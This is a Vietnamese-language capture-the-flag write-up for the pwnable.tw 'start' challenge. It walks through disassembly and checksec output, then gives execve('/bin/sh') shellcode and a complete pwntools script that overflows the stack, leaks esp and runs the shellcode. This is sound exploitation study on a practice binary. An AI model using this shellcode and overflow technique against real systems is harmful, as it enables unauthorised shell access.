# start

```python
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/start$ file start
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

```shell
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end
```

run thử binary:
```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/start$ ./start
Let's start the CTF:abc
```

### _start
```python
pwndbg> disass _start
Dump of assembler code for function _start:
   0x08048060 <+0>:     push   esp
   0x08048061 <+1>:     push   0x804809d
   0x08048066 <+6>:     xor    eax,eax
   0x08048068 <+8>:     xor    ebx,ebx
   0x0804806a <+10>:    xor    ecx,ecx
   0x0804806c <+12>:    xor    edx,edx
   0x0804806e <+14>:    push   0x3a465443
   0x08048073 <+19>:    push   0x20656874
   0x08048078 <+24>:    push   0x20747261
   0x0804807d <+29>:    push   0x74732073
   0x08048082 <+34>:    push   0x2774654c
   0x08048087 <+39>:    mov    ecx,esp
   0x08048089 <+41>:    mov    dl,0x14
   0x0804808b <+43>:    mov    bl,0x1
   0x0804808d <+45>:    mov    al,0x4
   0x0804808f <+47>:    int    0x80
   0x08048091 <+49>:    xor    ebx,ebx
   0x08048093 <+51>:    mov    dl,0x3c
   0x08048095 <+53>:    mov    al,0x3
   0x08048097 <+55>:    int    0x80
   0x08048099 <+57>:    add    esp,0x14
   0x0804809c <+60>:    ret
End of assembler dump.
```

Ok, giờ thì chúng ta cùng đọc asm.

Ta nhận thấy ở đây có 2 lần gọi **int 0x80** tức là có sử dungj systemcall, ta nhận thấy là **%eax = 0x3** là lệnh *read*, nếu **0x4** là lệnh *write*

Vậy thì có vẻ như chương trình dùng **write** để in ra dòng *Let's start the CTF:* sau đấy dùng **read** để mà đọc chuỗi từ user.

```js
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/start$ checksec start
[*] '/mnt/d/pwn_myself/pwnable_tw/start/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

Oke đỏ lè thế kia thì ta có thể dùng shellcode hay overflow tùy í. giờ thì bắt tay vào làm.

Đặt breakpoint tại **0x08048097 và 0x0804809c** tính được cần overflow 20bytes để đến được return address

Mà return thì return về đâu, kịch bản là ta sẽ add shellcode vào rồi gọi đến shell code để thực thi, tuy nhiên thì cần xác định địa chỉ của shellcode, mà shellcode được nạp vào stack nên cần phải leak được địa chỉ esp. Do đó ta sẽ return về hàm *write* nhằm leak các giá trị trên stack, và esp cũng nằm trên stack  

```python
0x08048099 <+57>:    add    esp,0x14
``` 
Do là sau khi read xong, thì thu hồi stack, **esp + 20** tức là 20 bytes  của chuối nãy ta in ra màn hình, nay đã thu hồi mà ta lại gọi hàm write => in ra các giá trị trên stack bao gồm cả *esp*

Sau khi mà đã leak được *esp* thì ta vào hàm read, lúc này ta gửi payload thứ 2 gồm: 20 bytes BOF, địa chỉ return về chính là địa chỉ lưu shellcode = esp + 20, shellcode

### shellcode
```python
sub esp,0x50
xor eax,eax
add eax,0x0b
xor ecx,ecx
xor edx,edx
push edx
push 0x0068732f
push 0x6e69622f
mov ebx,esp
int 0x80
```

### Exploit

```python
from pwn import *

#p = remote('chall.pwnable.tw',10000)
p = process("./start")

print(p.recvuntil(':'))
payload1 = b'A'*20 + p32(0x08048087) 
p.send(payload1)
#print(p.recv())

shellcode = b'\x83\xEC\x50\x31\xC0\x83\xC0\x0B\x31\xC9\x31\xD2\x52\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80'
payload2 = b'A'*20 + p32(u32(p.recv()[:4]) + 20) + shellcode

p.send(payload2)
p.interactive()
```